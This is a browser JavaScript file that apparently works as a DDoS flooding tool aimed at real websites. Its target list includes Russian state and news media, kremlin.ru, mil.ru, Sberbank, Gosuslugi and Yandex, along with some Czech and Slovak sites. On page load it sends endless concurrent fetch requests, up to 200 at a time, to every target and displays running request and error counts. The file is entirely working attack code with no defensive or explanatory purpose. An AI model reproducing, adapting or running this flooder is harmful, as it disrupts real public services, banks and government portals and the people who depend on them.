var targets = {
    "https://lenta.ru": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://ria.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://ria.ru/lenta/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://www.rbc.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://www.rt.com/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "http://kremlin.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "http://en.kremlin.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://smotrim.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://tass.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://tvzvezda.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://vsoloviev.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://www.1tv.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://www.vesti.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://online.sberbank.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://sberbank.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://gosuslugi.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://mil.ru": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://iz.ru": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://yandex.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://sputniknews.com/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://inosmi.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://gazeta.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://kommersant.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://rubaltic.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://ura.news/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://radiokp.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://echo.msk.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://life.ru/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://cz.sputniknews.com/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://sputniknews.com/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://www.parlamentnilisty.cz/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://zemavek.sk/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://hlavnespravy.sk/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://www.rudyprapor.cz/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "https://aliancenarodnichsil.cz/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    "http://otevrisvoumysl.cz/": {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
};

var statsEl = document.getElementById("stats");
function printStats() {
    statsEl.innerHTML = "<pre>" + JSON.stringify(targets, null, 2) + "</pre>";
}
setInterval(printStats, 100);

var CONCURRENCY_LIMIT = 200;
var queue = [];

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        signal: controller.signal,
        referrerPolicy: "no-referrer",
    })
        .then((response) => {
            clearTimeout(id);
            return response;
        })
        .catch((error) => {
            clearTimeout(id);
            throw error;
        });
}

async function flood(target) {
    for (var i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift();
        }
        queue.push(
            fetchWithTimeout(target, { timeout: 1000 })
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return;
                    }
                    targets[target].number_of_errored_responses++;
                    targets[target].error_message = error.message;
                })
                .then((response) => {
                    if (response && !response.ok) {
                        targets[target].number_of_errored_responses++;
                        targets[target].error_message = response.statusText;
                    }
                    targets[target].number_of_requests++;
                })
        );
    }
}

//Start
Object.keys(targets).map(flood);
